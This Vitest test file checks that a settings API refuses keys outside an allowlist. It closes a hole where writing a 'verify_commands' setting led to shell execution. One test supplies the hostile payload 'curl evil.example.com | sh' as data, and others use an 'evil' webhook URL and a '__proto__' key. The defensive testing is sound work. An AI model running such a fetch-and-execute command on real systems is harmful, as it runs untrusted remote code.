/**
 * B-arij-247, half three: `PATCH /api/settings` used to accept ANY key.
 *
 * The route type-checked a handful of known keys and wrote everything else
 * verbatim, so one request could set `verify_commands` (executed with
 * `shell: true` by the deterministic verification stage) or `global_prompt`
 * (prepended to every agent prompt) — turning a settings write into code
 * execution as the Arij user. The allowlist is the fix: a key Arij does not
 * know is refused, and nothing in the payload is written.
 *
 * The list has to cover the DYNAMIC keys too. Every per-project override is
 * `<base>:<scope>`, and a fix that only allowlisted the bare keys would break
 * the Full Auto popover, the project token budget and the per-project runtime
 * limits — the recurring "closed the hole, broke the legitimate client"
 * failure.
 */

import { beforeEach, describe, expect, it, vi } from "vitest";
import {
  dbMockState,
  resetDbMockState,
  mockJsonRequest,
} from "@/__tests__/helpers/db-mock";
import {
  isWritableSettingKey,
  WRITABLE_SETTING_KEYS,
  WRITABLE_SCOPED_SETTING_KEYS,
} from "@/lib/settings/writable-keys";

vi.mock("@/lib/db", async () => {
  const { dbModuleMock } = await import("@/__tests__/helpers/db-mock");
  return dbModuleMock();
});

async function patch(body: Record<string, unknown>) {
  const { PATCH } = await import("@/app/api/settings/route");
  const res = await PATCH(mockJsonRequest(body));
  return { res, json: await res.json() };
}

describe("PATCH /api/settings refuses unknown keys", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    resetDbMockState();
    dbMockState.getQueue = [null, null, null, null];
  });

  it("refuses a key Arij does not define", async () => {
    const { res, json } = await patch({ totally_made_up_key: "x" });
    expect(res.status).toBe(400);
    expect(json.error).toContain("totally_made_up_key");
    expect(dbMockState.insertCalls).toEqual([]);
    expect(dbMockState.updateCalls).toEqual([]);
  });

  it("refuses a near-miss of an executable key", async () => {
    // `verify_commands` runs with shell: true. A typo'd sibling must not slip
    // through on a prefix or a suffix match.
    for (const key of [
      "verify_commands_extra",
      "xverify_commands",
      "verify_commands ",
      "VERIFY_COMMANDS",
    ]) {
      const { res } = await patch({ [key]: ["curl evil.example.com | sh"] });
      expect(res.status, key).toBe(400);
    }
    expect(dbMockState.insertCalls).toEqual([]);
  });

  it("writes nothing at all when one key in the payload is unknown", async () => {
    const { res } = await patch({
      global_prompt: "legitimate",
      totally_made_up_key: "x",
    });
    expect(res.status).toBe(400);
    expect(dbMockState.insertCalls).toEqual([]);
    expect(dbMockState.updateCalls).toEqual([]);
  });

  it("does not echo an unbounded attacker string back", async () => {
    const huge = "z".repeat(5000);
    const { json } = await patch({ [huge]: 1 });
    expect(JSON.stringify(json).length).toBeLessThan(1000);
  });

  it("refuses a scoped key whose base is not scopable", async () => {
    const { res } = await patch({ "global_prompt:some-project": "x" });
    expect(res.status).toBe(400);
  });

  it("refuses a scoped key with an empty scope", async () => {
    const { res } = await patch({ "verify_commands:": ["echo"] });
    expect(res.status).toBe(400);
  });

  it("refuses the server-managed bookkeeping keys", async () => {
    // Written by the dreaming pass and the memory writer; a client that can
    // move the cutoff can make Dreaming re-read or skip a whole window.
    for (const key of [
      "dreaming_last_cutoff",
      "dreaming_last_cutoff:proj1",
      "memory_provenance:proj1",
    ]) {
      const { res } = await patch({ [key]: "2026-01-01T00:00:00.000Z" });
      expect(res.status, key).toBe(400);
    }
  });

  it("refuses webhook URLs, which have their own guarded route", async () => {
    const { res } = await patch({ "webhook_url:proj1": "https://evil/hook" });
    expect(res.status).toBe(400);
  });
});

describe("PATCH /api/settings still accepts every legitimate key", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    resetDbMockState();
  });

  it("accepts each bare key the app defines", async () => {
    for (const key of WRITABLE_SETTING_KEYS) {
      resetDbMockState();
      dbMockState.getQueue = [null];
      // A value every key's own type check tolerates.
      const value =
        key === "github_pat" ||
        key === "openai_api_key" ||
        key === "projects_root"
          ? ""
          : key === "ui_locale"
            ? null
            : key === "github_oauth_meta"
              ? null
              : true;
      const { res } = await patch({ [key]: value });
      expect(res.status, key).toBe(200);
    }
  });

  it("accepts a per-project override for each scopable key", async () => {
    for (const base of WRITABLE_SCOPED_SETTING_KEYS) {
      resetDbMockState();
      dbMockState.getQueue = [null];
      const { res } = await patch({ [`${base}:PrOj-123_xyz`]: 1 });
      expect(res.status, base).toBe(200);
    }
  });

  it("keeps the surfaces that write dynamic keys working", async () => {
    // The exact keys the shipped UI PATCHes with a `:<scope>` suffix.
    for (const key of [
      "prompt_token_budget:proj1",
      "agent_max_concurrent:proj1",
      "auto_mode_enabled:proj1",
      "auto_mode_build_agent:proj1",
      "watchdog_threshold_minutes:team_build",
    ]) {
      resetDbMockState();
      dbMockState.getQueue = [null];
      const { res } = await patch({ [key]: 1 });
      expect(res.status, key).toBe(200);
    }
  });

  it("still enforces the per-key type checks it already had", async () => {
    dbMockState.getQueue = [null];
    const { res, json } = await patch({ github_pat: { token: "ghp_bad" } });
    expect(res.status).toBe(400);
    expect(json.error).toBe("GitHub token must be saved as a string value.");
  });
});

describe("the allowlist itself", () => {
  it("recognises bare and scoped forms and nothing else", () => {
    expect(isWritableSettingKey("global_prompt")).toBe(true);
    expect(isWritableSettingKey("verify_commands")).toBe(true);
    expect(isWritableSettingKey("verify_commands:proj1")).toBe(true);
    expect(isWritableSettingKey("global_prompt:proj1")).toBe(false);
    expect(isWritableSettingKey("")).toBe(false);
    expect(isWritableSettingKey("__proto__")).toBe(false);
  });
});
